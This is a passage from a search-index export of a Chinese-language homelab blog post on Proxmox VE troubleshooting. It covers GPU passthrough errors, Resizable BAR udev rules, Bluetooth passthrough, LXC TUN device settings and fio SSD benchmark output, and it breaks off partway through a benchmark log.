<p>\u5e76\u4e14\u6211\u4e5f\u53d1\u73b0\u4e86\u4e00\u4e2a\u4e0d\u592a\u6b63\u5e38\u7684\u73b0\u8c61\u3002GPU-Z\u53ea\u6709\u5728\u7b2c\u4e00\u6b21\u6253\u5f00\u65f6UEFI\u72b6\u6001\u662f\u52fe\u4e0a\u7684\uff0c\u5173\u95edGPU-Z\u8f6f\u4ef6\u7136\u540e\u518d\u6253\u5f00\uff0cUEFI\u5c31\u4f1a\u53d8\u4e3a\u672a\u52fe\u9009\u72b6\u6001\u3002\u5e76\u6253\u5f00GPU-Z\u8f6f\u4ef6\u51e0\u79d2\u540e\uff0cbus interface\u4e5f\u4f1a\u4ecePCIex16 3.0@x16 3.0\u53d8\u4e3a PCI\u3002</p> <p>\u5728\u5c06CPU\u4ecehost\u6362\u6210KVM64\u540e\uff0c\u4e0a\u9762\u7684\u95ee\u9898\u5c31\u88ab\u89e3\u51b3\u4e86\u3002GPU-Z UEFI\u548cbus interface\u663e\u793a\u7684\u90fd\u662f\u6b63\u786e\u7684\u3002</p> <p>VIDEO_DXGKRNL_FATAL_ERROR in a Windows VM - workarounds? | Proxmox Support Forum - \u8fd9\u4e2a\u5e16\u5b50\u8ba4\u4e3a\u662fMSI\u8fd9\u79cd\u8f6f\u4ef6\u8bfb\u53d6\u4e86\u5e95\u5c42\u7684\u4e0d\u5b58\u5728\u7684\u5bc4\u5b58\u5668\u5bfc\u81f4\u7cfb\u7edf\u5d29\u6e83</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#43\u9519\u8bef","title":"43\u9519\u8bef","text":"<ol> <li> <p>\u663e\u5361\u9a71\u52a8\u68c0\u6d4b\u865a\u62df\u673a \u6700\u65e9\u4f7f\u7528KVM\u521b\u5efa\u865a\u62df\u673a\uff0c\u9047\u5230\u7684\u4fbf\u662f\u8fd9\u4e2a\u3002\u5b89\u88c5\u82f1\u4f1f\u8fbe\u6700\u65b0\u9a71\u52a8\u5373\u53ef</p> <p>Video card drivers by AMD incorporate very basic virtual machine detection targeting Hyper-V extensions. Should this detection mechanism trigger, the drivers will refuse to run, resulting in a black screen. Nvidia guest drivers prior to version 465 exhibited a similar behaviour which resulted in a generic error 43 in the card's device manager status. Systems using these older drivers therefore also need the above modification. In addition, they also require hiding the KVM CPU leaf</p> </li> <li> <p>Resizable Bar is turned on in the bios</p> </li> </ol> <p>If you own a GPU that supports Resizable BAR / SAM and have the corresponding BIOS option enabled, you might get code 43 because this feature is disabled in QEMU\u00a0[11]. Linux Kernel release 6.1 added option to manipulate PCIe Resizable BARs through\u00a0sysfs, so you can try permanently resizing it using a\u00a0udev\u00a0rule: <pre><code>/etc/udev/rules.d/01-amd.rules\n\nACTION==\"add\", SUBSYSTEM==\"pci\", ATTR{vendor}==\"0x1002\", ATTR{device}==\"0x73bf\", ATTR{resource0_resize}=\"14\"\nACTION==\"add\", SUBSYSTEM==\"pci\", ATTR{vendor}==\"0x1002\", ATTR{device}==\"0x73bf\", ATTR{resource2_resize}=\"8\"\n</code></pre></p> <p>Alternatively, to temporarily resize the PCIe BAR, you can write the new size to\u00a0<code>/sys/bus/pci/devices/_device_address_/resource_number__resize</code>, where\u00a0device_address\u00a0is the address of your GPU, such as\u00a0<code>0000:03:00.0</code>\u00a0(note that for changing this parameter, no driver can be loaded for the device).</p> <p>You can confirm values using\u00a0<code>lspci -vvvxxxx</code>.</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#amd-reset-bug","title":"AMD reset bug","text":"<p>Working around the AMD GPU Reset bug on Proxmox using vendor-reset \u2013 Nicholas Sherlock (nicksherlock.com)</p> <p>This is especially a problem if you only have one GPU in your system, because it will be your primary GPU and so be initialised by the host UEFI during boot, rendering it unusable for passthrough even a single time.</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#6500xt\u6027\u80fd\u5f88\u5dee","title":"6500xt\u6027\u80fd\u5f88\u5dee","text":"<p>\u5deb\u5e08\u4e091080p\u53ea\u6709\u51e0\u5341fps\uff0c\u5e76\u4e14\u6709\u65f6\u5019\u8dd1benchmark\u65f6\uff0cvm\u4f1a\u81ea\u52a8\u5173\u673a\u3002</p> <p>\u53d1\u73b0\u4e0d\u80fd\u5b89\u88c5amd\u6700\u65b0\u9a71\u52a8\uff0c\u7c7b\u4f3c\u4e8e\u82af\u7247\u7ec4\u4e0d\u8bc6\u522b</p> <ul> <li>can't install amd adrenalin software</li> <li> <p>Unable to install AMD GPU Drivers in Windows guest VM - VM Engine (KVM) - Unraid</p> </li> <li> <p>BOSD\u95ee\u9898</p> </li> <li>reset bug\uff1aSymptoms included the display going black and the GPU fans kicking on higher for no reason.(7) Radeon Adrenaline Software installation kills the VM : VFIO (reddit.com)</li> </ul> <p>\u4ed4\u7ec6\u7814\u7a76\u540e\u53d1\u73b0\uff0camd reset bug\u662f\u6307\u91cd\u542f\u865a\u62df\u673a\u540e\u4f1a\u9ed1\u5c4f\uff0c\u4e0d\u662f\u6240\u6709\u5361\u90fd\u4f1a\u9047\u5230\u8be5\u95ee\u9898\u3002 \u5e76\u4e14amd vendor reset github\u4ed3\u5e93\u5e76\u4e0d\u652f\u63016500xt\u3002\u56e0\u6b64\u8c8c\u4f3c\u548c\u8fd9\u91cc\u7684\u95ee\u9898\u65e0\u5173\u3002</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#unbind-gpu","title":"unbind gpu","text":"<p>\u672a\u6d4b\u8bd5 (2) Recover GPU from VM after it shuts down | Proxmox Support Forum <pre><code>echo \"0000:01:00.0\" &gt; \"/sys/bus/pci/devices/0000:01:00.0/driver/unbind\" &amp;&amp; echo \"0000:01:00.0\" &gt; \"/sys/bus/pci/drivers/amdgpu/bind\"\necho \"0000:01:00.1\" &gt; \"/sys/bus/pci/devices/0000:01:00.1/driver/unbind\" &amp;&amp; echo \"0000:01:00.1\" &gt; \"/sys/bus/pci/drivers/snd_hda_intel/bind\"\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u8d44\u6599\u6536\u96c6","title":"\u8d44\u6599\u6536\u96c6","text":"<p>Appendix\u00a0G.\u00a0Configuring a Host for PCI Passthrough Red Hat Virtualization 4.1 | Red Hat Customer Portal --- \u9644\u5f55 G. \u4e3a PCI \u76f4\u901a\u914d\u7f6e\u4e3b\u673a \u7ea2\u5e3d\u865a\u62df\u5316 4.1 |\u7ea2\u5e3d\u5ba2\u6237\u95e8\u6237</p> <p>iommu=pt\u80fd\u591f\u63d0\u9ad8\u6027\u80fd If\u00a0<code>intel_iommu=on</code>\u00a0or\u00a0<code>amd_iommu=on</code>\u00a0works, you can try replacing them with\u00a0<code>iommu=pt</code>\u00a0or\u00a0<code>amd_iommu=pt</code>. The\u00a0<code>pt</code>\u00a0option only enables IOMMU for devices used in passthrough and will provide better host performance. However, the option may not be supported on all hardware. Revert to previous option if the\u00a0<code>pt</code>\u00a0option doesn't work for your host.</p> <p>allow_unsafe_interrupts\u9009\u9879 If the passthrough fails because the hardware does not support interrupt remapping, you can consider enabling the\u00a0<code>allow_unsafe_interrupts</code>\u00a0option if the virtual machines are trusted. The\u00a0<code>allow_unsafe_interrupts</code>\u00a0is not enabled by default because enabling it potentially exposes the host to MSI attacks from virtual machines. To enable the option:</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#redhat","title":"redhat","text":"<p>Product Documentation for Red Hat Virtualization 4.4 | Red Hat Customer Portal Red Hat Virtualization 4.4 Setting up an NVIDIA GPU for a virtual machine in Red Hat Virtualization</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u5176\u5b83\u95ee\u9898","title":"\u5176\u5b83\u95ee\u9898","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u76f4\u901aax200\u6ca1\u6709\u84dd\u7259\u89e3\u51b3","title":"\u76f4\u901aAX200\u6ca1\u6709\u84dd\u7259\uff08\u89e3\u51b3\uff09","text":"<p>[\u6c42\u52a9] VM\u76f4\u901aAX210\u84dd\u7259\u9047\u5230\u95ee\u9898 - Chinese / \u7b80\u4f53\u4e2d\u6587 - Unraid - \u770b\u5230\u522b\u4eba\u90fd\u662flsusb\u80fd\u770b\u5230\u96c6\u6210\u7684\u84dd\u7259\uff0c\u4f46\u662f\u6211\u7684\u6ca1\u6709\u3002</p> <p>[SOLVED] No bluetooth adaptater on AX200 / Kernel &amp; Hardware / Arch Linux Forums \u6211\u7684\u8f93\u51fa\u6ca1\u6709\u4efb\u4f55firware load\u7684\u4fe1\u606f</p> <pre><code>root@ryzen-pve \u279c  ~ dmesg | grep firm\n[    0.512405] Spectre V2 : Enabling Restricted Speculation for firmware calls\n[    7.689816] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2\n\nroot@ryzen-pve \u279c  ~ ls /lib/firmware |grep a0\niwlwifi-cc-a0-66.ucode.xz\niwlwifi-cc-a0-72.ucode.xz\n</code></pre> <p>\u6211\u8fd9\u91cc\u6ca1\u6709AX200 Bluetooth\uff0c\u8fd9\u662f\u522b\u4eba\u7684\u8f93\u51fa <pre><code>[(16:36:45)xeph:~]lsusb\nBus 004 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub\nBus 003 Device 003: ID 8087:0029 Intel Corp. AX200 Bluetooth\nBus 003 Device 002: ID 046d:c52b Logitech, Inc. Unifying Receiver\nBus 003 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub\nBus 002 Device 002: ID 05e3:0620 Genesys Logic, Inc. GL3523 Hub\nBus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub\nBus 001 Device 004: ID 048d:c101 Integrated Technology Express, Inc. ITE Device(8910)\nBus 001 Device 003: ID 13d3:56ff IMC Networks Integrated Camera\nBus 001 Device 002: ID 05e3:0610 Genesys Logic, Inc. Hub\nBus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub\n</code></pre></p> <p>\u611f\u89c9\u53ef\u80fd\u662f\u56e0\u4e3a\u7ed1\u5b9a\u4e86vifo-pci\u5bfc\u81f4\u7684\uff1f Does anyone know how to pass through the Wi Fi 6 ax200 network card to a virtual machine with Kali Linux OS? - VM Engine (KVM) - Unraid --- \u6709\u8c01\u77e5\u9053\u5982\u4f55\u901a\u8fc7Wi Fi 6 ax200\u7f51\u5361\u4f20\u9012\u5230\u5e26\u6709Kali Linux\u64cd\u4f5c\u7cfb\u7edf\u7684\u865a\u62df\u673a\uff1f- \u865a\u62df\u673a\u5f15\u64ce \uff08KVM\uff09 - \u53d6\u6d88\u7a81\u88ad [6.10.0-RC1] Onboard Bluetooth no longer able to passthrough to VM - Prereleases - Unraid --- [6.10.0-RC1]\u677f\u8f7d\u84dd\u7259\u65e0\u6cd5\u518d\u76f4\u901a\u5230 VM - \u552e\u524d\u8d5b - \u53d6\u6d88\u7a81\u88ad</p> <p>\u597d\u50cf\u548c\u6211\u4e00\u6837\uff0c\u84dd\u7259\u4eceusb\u4e2d\u6d88\u5931 PVE 7.4 + Home Assistant: Intel AX200 Bluetooth issues | Proxmox Support Forum --- PVE 7.4 + \u5bb6\u5ead\u52a9\u7406\uff1a \u82f1\u7279\u5c14 AX200 \u84dd\u7259\u95ee\u9898 |Proxmox \u652f\u6301\u8bba\u575b</p> <p>\u65e7\u7b14\u8bb0\u672c\u4e0a\u7684ax200 lsusb\u786e\u5b9e\u80fd\u770b\u5230\u8bbe\u5907</p> <p>update\uff1a\u53ef\u80fd\u539f\u56e0\u786e\u5b9e\u662f\u7ed1\u5b9a\u4e86vifo-pci\uff0c\u5bfc\u81f4\u6ca1\u6709\u770b\u5230bluetooth\u3002\u540e\u9762\u4e0d\u77e5\u9053\u600e\u4e48\u80fd\u770b\u5230usb\u84dd\u7259\u4e86\u3002 \u4f46\u5728win10\u865a\u62df\u673a\u4e2d\uff0c\u65e0\u6cd5\u8bc6\u522b\u8bbe\u5907 \u89e3\u51b3\u65b9\u6cd5\u4e3a\uff08\u5982\u679c\u65e0\u6cd5\u79fb\u9664\uff0c\u663e\u793ain use\uff0c\u90a3\u4e48\u5c31\u6dfb\u52a0\u5230blacklist\u4e2d\uff0c\u7136\u540e\u91cd\u542fhost\uff09 <pre><code>modprobe -r btusb\nmodprobe -r bluetooth\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u4fee\u6539hostname\u5bc4","title":"\u4fee\u6539hostname\u5bc4","text":"<p>Fix Proxmox Error after hostname/ip change (web-wilke.de) \u4fee\u6539\u4e86hostname\u540e\uff0c\u5bb9\u5668\u865a\u62df\u673a\u90fd\u770b\u4e0d\u89c1\u4e86\u3002\u5c1d\u8bd5\u4fee\u6539/etc/hosts\u4f46\u662f\u4e0d\u591f\uff0c\u6700\u540e\u6ca1\u5f04\u597d\uff0c\u8fd8\u662f\u6539\u56de\u539f\u6765\u7684hostname\u4e86\u3002</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u5907\u4efd\u5355\u4e2adisk","title":"\u5907\u4efd\u5355\u4e2adisk","text":"<p>zfs\u81ea\u5df1\u5907\u4efd\u53ef\u4ee5\u5417\uff1f \u6211\u521b\u5efa\u7684VM\u4e0d\u77e5\u4e3a\u4f55\u4e0d\u652f\u6301\u5feb\u7167\u3002</p> <p>backup single disk in VM | Proxmox Support Forum</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#zerotier\u65e0\u6cd5\u542f\u52a8","title":"zerotier\u65e0\u6cd5\u542f\u52a8","text":"<p>OpenVPN in LXC - Proxmox VE</p> <p>\u7279\u6743\u5bb9\u5668\u6216\u6dfb\u52a0\u6743\u9650</p> <pre><code>vim /etc/pve/lxc/100.conf\n\n...\nonboot: 1\nostype: unmanaged\nparent: basic\nrootfs: local-zfs:subvol-100-disk-0,size=100G\nswap: 0\nunprivileged: 1\nlxc.cgroup2.devices.allow: c 10:200 rwm\nlxc.mount.entry: /dev/net dev/net none bind,create=dir\n\n[basic]\n#%E5%9F%BA%E6%9C%AC%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%8Cddns%EF%BC%8Cwg_s2s%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5op1,op3\narch: amd64\ncores: 2\nhostname: op2\n</code></pre> <pre><code>chown 100000:100000 /dev/net/tun\n</code></pre>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u78c1\u76d8\u6d4b\u901f","title":"\u78c1\u76d8\u6d4b\u901f","text":"<p>ryzen\u865a\u62df\u673a</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#pcie40-\u7231\u56fd\u80052t","title":"pcie4.0 \u7231\u56fd\u80052T","text":"<pre><code>\u279c  fio sudo fio --filename=test.bin ssd-win-likely.fio\nseq-read-4m: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nseq-write-4m: (g=1): rw=write, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nrand-read-4k: (g=2): rw=randread, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nrand-write-4k: (g=3): rw=randwrite, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nfio-3.28\nStarting 4 processes\nseq-read-4m: Laying out IO file (1 file / 10240MiB)\nJobs: 1 (f=1): [_(3),w(1)][68.5%][w=80.5MiB/s][w=20.6k IOPS][eta 01m:10s]\nseq-read-4m: (groupid=0, jobs=1): err= 0: pid=778450: Fri Sep 29 23:47:57 2023\n  read: IOPS=556, BW=2226MiB/s (2334MB/s)(10.0GiB/4600msec)\n    slat (usec): min=47, max=7932, avg=478.16, stdev=665.62\n    clat (msec): min=8, max=162, avg=56.62, stdev=22.04\n     lat (msec): min=8, max=162, avg=57.10, stdev=21.94\n    clat percentiles (msec):\n     |  1.00th=[   15],  5.00th=[   23], 10.00th=[   28], 20.00th=[   36],\n     | 30.00th=[   44], 40.00th=[   51], 50.00th=[   59], 60.00th=[   64],\n     | 70.00th=[   69], 80.00th=[   74], 90.00th=[   82], 95.00th=[   91],\n     | 99.00th=[  131], 99.50th=[  142], 99.90th=[  159], 99.95th=[  161],\n     | 99.99th=[  163]\n   bw (  MiB/s): min= 1993, max= 2336, per=99.89%, avg=2223.66, stdev=118.21, samples=8\n   iops        : min=  498, max=  584, avg=555.63, stdev=29.56, samples=8\n  lat (msec)   : 10=0.08%, 20=3.01%, 50=36.45%, 100=58.32%, 250=2.15%\n  cpu          : usr=0.89%, sys=25.74%, ctx=2221, majf=1, minf=32780\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nseq-write-4m: (groupid=1, jobs=1): err= 0: pid=778524: Fri Sep 29 23:47:57 2023\n  write: IOPS=82, BW=330MiB/s (346MB/s)(10.0GiB/31034msec); 0 zone resets\n    slat (usec): min=76, max=221964, avg=1061.67, stdev=5512.31\n    clat (msec): min=4, max=7483, avg=385.10, stdev=1126.37\n     lat (msec): min=5, max=7484, avg=386.16, stdev=1126.51\n    clat percentiles (msec):\n     |  1.00th=[   12],  5.00th=[   22], 10.00th=[   27], 20.00th=[   34],\n     | 30.00th=[   43], 40.00th=[   52], 50.00th=[   64], 60.00th=[   74],\n     | 70.00th=[   96], 80.00th=[  142], 90.00th=[  502], 95.00th=[ 2970],\n     | 99.00th=[ 5604], 99.50th=[ 5604], 99.90th=[ 7483], 99.95th=[ 7483],\n     | 99.99th=[ 7483]\n   bw (  KiB/s): min=65667, max=2682078, per=100.00%, avg=823187.87, stdev=652362.03, samples=24\n   iops        : min=   16, max=  654, avg=200.58, stdev=159.18, samples=24\n  lat (msec)   : 10=0.82%, 20=2.77%, 50=34.80%, 100=32.73%, 250=15.51%\n  lat (msec)   : 500=3.20%, 750=1.64%, 1000=0.55%, 2000=1.41%, &gt;=2000=6.56%\n  cpu          : usr=3.45%, sys=5.12%, ctx=1899, majf=0, minf=15\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,2560,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nrand-read-4k: (groupid=2, jobs=1): err= 0: pid=778956: Fri Sep 29 23:47:57 2023\n  read: IOPS=50.4k, BW=197MiB/s (207MB/s)(10.0GiB/51982msec)\n    slat (nsec): min=1170, max=3868.5k, avg=4517.95, stdev=7664.76\n    clat (nsec): min=220, max=1695.1M, avg=74038.40, stdev=2120026.59\n     lat (usec): min=12, max=1695.1k, avg=78.64, stdev=2120.05\n    clat percentiles (usec):\n     |  1.00th=[   18],  5.00th=[   21], 10.00th=[   23], 20.00th=[   26],\n     | 30.00th=[   33], 40.00th=[   76], 50.00th=[   81], 60.00th=[   84],\n     | 70.00th=[   88], 80.00th=[   93], 90.00th=[  105], 95.00th=[  123],\n     | 99.00th=[  210], 99.50th=[  293], 99.90th=[  627], 99.95th=[ 1074],\n     | 99.99th=[ 1975]\n   bw (  KiB/s): min= 5643, max=270960, per=100.00%, avg=205429.51, stdev=34312.15, samples=101\n   iops        : min= 1410, max=67740, avg=51357.30, stdev=8578.07, samples=101\n  lat (nsec)   : 250=0.01%, 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 10=0.01%, 20=4.52%, 50=32.03%, 100=50.56%\n  lat (usec)   : 250=12.11%, 500=0.62%, 750=0.08%, 1000=0.02%\n  lat (msec)   : 2=0.05%, 4=0.01%, 10=0.01%, 20=0.01%, 50=0.01%\n  lat (msec)   : 500=0.01%, 2000=0.01%\n  cpu          : usr=7.47%, sys=29.84%, ctx=1440214, majf=0, minf=21\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2621440,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\nrand-write-4k: (groupid=3, jobs=1): err= 0: pid=779798: Fri Sep 29 23:47:57 2023\n  write: IOPS=20.3k, BW=79.1MiB/s (83.0MB/s)(4748MiB/60005msec); 0 zone resets\n    slat (nsec): min=1270, max=418621k, avg=6166.83, stdev=381021.38\n    clat (nsec): min=290, max=1815.5M, avg=190356.30, stdev=6618668.74\n     lat (usec): min=16, max=1815.5k, avg=196.62, stdev=6629.88\n    clat percentiles (usec):\n     |  1.00th=[   21],  5.00th=[   26], 10.00th=[   30], 20.00th=[   52],\n     | 30.00th=[   83], 40.00th=[   87], 50.00th=[   91], 60.00th=[   95],\n     | 70.00th=[  102], 80.00th=[  120], 90.00th=[  188], 95.00th=[  318],\n     | 99.00th=[ 1844], 99.50th=[ 2008], 99.90th=[ 4424], 99.95th=[ 7635],\n     | 99.99th=[20579]\n   bw (  KiB/s): min= 1920, max=185240, per=100.00%, avg=88600.73, stdev=62711.61, samples=108\n   iops        : min=  480, max=46310, avg=22150.14, stdev=15677.91, samples=108\n  lat (nsec)   : 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=0.63%, 50=19.19%\n  lat (usec)   : 100=47.74%, 250=25.71%, 500=3.06%, 750=0.44%, 1000=0.25%\n  lat (msec)   : 2=2.46%, 4=0.39%, 10=0.08%, 20=0.02%, 50=0.01%\n  lat (msec)   : 100=0.01%, 500=0.01%, 750=0.01%, 1000=0.01%, 2000=0.01%\n  cpu          : usr=2.85%, sys=12.76%, ctx=889109, majf=0, minf=17\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,1215500,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\n\nRun status group 0 (all jobs):\n   READ: bw=2226MiB/s (2334MB/s), 2226MiB/s-2226MiB/s (2334MB/s-2334MB/s), io=10.0GiB (10.7GB), run=4600-4600msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=330MiB/s (346MB/s), 330MiB/s-330MiB/s (346MB/s-346MB/s), io=10.0GiB (10.7GB), run=31034-31034msec\n\nRun status group 2 (all jobs):\n   READ: bw=197MiB/s (207MB/s), 197MiB/s-197MiB/s (207MB/s-207MB/s), io=10.0GiB (10.7GB), run=51982-51982msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=79.1MiB/s (83.0MB/s), 79.1MiB/s-79.1MiB/s (83.0MB/s-83.0MB/s), io=4748MiB (4979MB), run=60005-60005msec\n\nDisk stats (read/write):\n  sdb: ios=2641793/1235910, merge=38/87, ticks=1077282/5674545, in_queue=6778554, util=94.90%\n</code></pre>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u4e09\u661f981at","title":"\u4e09\u661f981at","text":"<pre><code>\u279c  fio sudo fio --directory=/root/ --filename=test.bin ssd-win-likely.fio\nseq-read-4m: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nseq-write-4m: (g=1): rw=write, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nrand-read-4k: (g=2): rw=randread, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nrand-write-4k: (g=3): rw=randwrite, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nfio-3.28\nStarting 4 processes\nseq-read-4m: Laying out IO file (1 file / 10240MiB)\nJobs: 1 (f=0): [_(3),f(1)][100.0%][w=69.1MiB/s][w=17.7k IOPS][eta 00m:00s]\nseq-read-4m: (groupid=0, jobs=1): err= 0: pid=787066: Fri Sep 29 23:56:40 2023\n  read: IOPS=460, BW=1841MiB/s (1930MB/s)(10.0GiB/5563msec)\n    slat (usec): min=53, max=9744, avg=478.53, stdev=703.84\n    clat (msec): min=9, max=889, avg=68.36, stdev=87.28\n     lat (msec): min=10, max=889, avg=68.84, stdev=87.24\n    clat percentiles (msec):\n     |  1.00th=[   16],  5.00th=[   23], 10.00th=[   28], 20.00th=[   36],\n     | 30.00th=[   43], 40.00th=[   51], 50.00th=[   59], 60.00th=[   67],\n     | 70.00th=[   74], 80.00th=[   82], 90.00th=[   91], 95.00th=[  106],\n     | 99.00th=[  743], 99.50th=[  885], 99.90th=[  885], 99.95th=[  885],\n     | 99.99th=[  894]\n   bw (  MiB/s): min=  945, max= 2324, per=100.00%, avg=1988.74, stdev=387.84, samples=10\n   iops        : min=  236, max=  581, avg=496.70, stdev=96.92, samples=10\n  lat (msec)   : 10=0.04%, 20=2.54%, 50=36.60%, 100=54.69%, 250=4.92%\n  lat (msec)   : 750=0.39%, 1000=0.82%\n  cpu          : usr=0.58%, sys=21.22%, ctx=2383, majf=0, minf=32780\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nseq-write-4m: (groupid=1, jobs=1): err= 0: pid=787186: Fri Sep 29 23:56:40 2023\n  write: IOPS=235, BW=940MiB/s (986MB/s)(10.0GiB/10890msec); 0 zone resets\n    slat (usec): min=69, max=73786, avg=783.64, stdev=3051.53\n    clat (msec): min=2, max=2041, avg=135.28, stdev=287.50\n     lat (msec): min=2, max=2042, avg=136.06, stdev=287.42\n    clat percentiles (msec):\n     |  1.00th=[   14],  5.00th=[   21], 10.00th=[   27], 20.00th=[   36],\n     | 30.00th=[   46], 40.00th=[   57], 50.00th=[   68], 60.00th=[   83],\n     | 70.00th=[  102], 80.00th=[  126], 90.00th=[  182], 95.00th=[  326],\n     | 99.00th=[ 2022], 99.50th=[ 2022], 99.90th=[ 2039], 99.95th=[ 2039],\n     | 99.99th=[ 2039]\n   bw (  MiB/s): min=  370, max= 2341, per=100.00%, avg=1198.88, stdev=516.41, samples=16\n   iops        : min=   92, max=  585, avg=299.31, stdev=129.04, samples=16\n  lat (msec)   : 4=0.20%, 10=0.55%, 20=4.14%, 50=29.77%, 100=34.84%\n  lat (msec)   : 250=24.14%, 500=2.30%, 750=1.05%, 2000=1.76%, &gt;=2000=1.25%\n  cpu          : usr=7.14%, sys=12.19%, ctx=1959, majf=0, minf=14\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,2560,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nrand-read-4k: (groupid=2, jobs=1): err= 0: pid=787189: Fri Sep 29 23:56:40 2023\n  read: IOPS=42.8k, BW=167MiB/s (175MB/s)(9.79GiB/60001msec)\n    slat (nsec): min=1180, max=378282k, avg=4607.87, stdev=236197.07\n    clat (nsec): min=240, max=1725.2M, avg=87451.41, stdev=4192102.00\n     lat (usec): min=12, max=1725.2k, avg=92.80, stdev=4327.60\n    clat percentiles (usec):\n     |  1.00th=[   18],  5.00th=[   21], 10.00th=[   22], 20.00th=[   26],\n     | 30.00th=[   30], 40.00th=[   47], 50.00th=[   92], 60.00th=[   96],\n     | 70.00th=[   99], 80.00th=[  104], 90.00th=[  115], 95.00th=[  129],\n     | 99.00th=[  212], 99.50th=[  306], 99.90th=[  578], 99.95th=[  742],\n     | 99.99th=[ 1893]\n   bw (  